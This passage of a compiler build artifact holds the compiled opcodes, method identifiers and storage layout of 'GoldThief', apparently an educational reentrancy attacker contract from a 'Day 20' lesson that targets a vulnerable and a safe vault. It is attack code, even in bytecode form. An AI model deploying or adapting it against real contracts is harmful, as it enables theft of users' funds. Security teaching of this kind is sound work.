0xFF AND ISZERO PUSH2 0x211 JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x7FD42617 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1FA JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x20C JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x222 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x22B PUSH2 0x313 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x238 SWAP2 SWAP1 PUSH2 0x8E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x24C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x255 PUSH2 0x31A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x262 SWAP2 SWAP1 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x276 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x27F PUSH2 0x33D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x28C SWAP2 SWAP1 PUSH2 0x8E1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x29D PUSH2 0x343 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x2A7 PUSH2 0x536 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2B4 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x2BD PUSH2 0x728 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2CA SWAP2 SWAP1 PUSH2 0x9A7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2DE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x2E7 PUSH2 0x73A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x2F4 SWAP2 SWAP1 PUSH2 0x9E0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x308 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x311 PUSH2 0x75F JUMP JUMPDEST STOP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x3D2 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3C9 SWAP1 PUSH2 0xA53 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x41D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x414 SWAP1 PUSH2 0xABB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x3 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4A3 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4B5 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x7FD42617 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x51E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x530 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x5C5 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x5BC SWAP1 PUSH2 0xA53 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x610 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x607 SWAP1 PUSH2 0xB23 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH1 0x3 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x695 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x6A7 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x710957CC PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x710 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x722 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x3 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x7EE JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x7E5 SWAP1 PUSH2 0xA53 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x852 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x895 DUP3 PUSH2 0x882 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x8C7 JUMPI PUSH2 0x8C6 PUSH2 0x855 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8DB DUP2 PUSH2 0x882 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x8F4 PUSH0 DUP4 ADD DUP5 PUSH2 0x8D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x93C PUSH2 0x937 PUSH2 0x932 DUP5 PUSH2 0x8FA JUMP JUMPDEST PUSH2 0x919 JUMP JUMPDEST PUSH2 0x8FA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x94D DUP3 PUSH2 0x922 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x95E DUP3 PUSH2 0x943 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x96E DUP2 PUSH2 0x954 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x987 PUSH0 DUP4 ADD DUP5 PUSH2 0x965 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9A1 DUP2 PUSH2 0x98D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x9BA PUSH0 DUP4 ADD DUP5 PUSH2 0x998 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x9CA DUP3 PUSH2 0x8FA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9DA DUP2 PUSH2 0x9C0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x9F3 PUSH0 DUP4 ADD DUP5 PUSH2 0x9D1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C79206F776E657200000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA3D PUSH1 0xA DUP4 PUSH2 0x9F9 JUMP JUMPDEST SWAP2 POP PUSH2 0xA48 DUP3 PUSH2 0xA09 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA6A DUP2 PUSH2 0xA31 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312045544800000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAA5 PUSH1 0x13 DUP4 PUSH2 0x9F9 JUMP JUMPDEST SWAP2 POP PUSH2 0xAB0 DUP3 PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAD2 DUP2 PUSH2 0xA99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E656564206174206C6561737420312045544820746F2061747461636B000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xB0D PUSH1 0x1D DUP4 PUSH2 0x9F9 JUMP JUMPDEST SWAP2 POP PUSH2 0xB18 DUP3 PUSH2 0xAD9 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xB3A DUP2 PUSH2 0xB01 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xB6 0x1E REVERT PUSH0 LOG3 KECCAK256 0xB1 MOD CALLDATACOPY SWAP13 DELEGATECALL 0x2A 0xD1 EXTCODEHASH 0x21 0xCB DUP2 SWAP12 SWAP3 0xCE PUSH7 0xFD3CCA0FC73D0D PUSH4 0x174D6164 PUSH20 0x6F6C634300081800330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "587000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attackCount()": "2470",
						"attackSafe()": "infinite",
						"attackVulnerable()": "infinite",
						"attackingSafe()": "2488",
						"getBalance()": "335",
						"owner()": "2552",
						"stealLoot()": "infinite",
						"targetVault()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attackCount()": "407c2821",
					"attackSafe()": "494eba64",
					"attackVulnerable()": "67a3fde8",
					"attackingSafe()": "71cb791a",
					"getBalance()": "12065fe0",
					"owner()": "8da5cb5b",
					"stealLoot()": "cff53a4a",
					"targetVault()": "1f92db45"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 14,
						"contract": "Day 20/GoldThief.sol:GoldThief",
						"label": "targetVault",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IVault)11"
					},
					{
						"astId": 16,
						"contract": "Day 20/GoldThief.sol:GoldThief",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 18,
						"contract": "Day 20/GoldThief.sol:GoldThief",
						"label": "attackCount",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					},
					{
						"astId": 20,
						"contract": "Day 20/GoldThief.sol:GoldThief",
						"label": "attackingSafe",
						"offset": 0,
						"slot": "3",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(IVault)11": {
						"encoding": "inplace",
						"label": "contract IVault",
						"numberOfBytes": "20"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}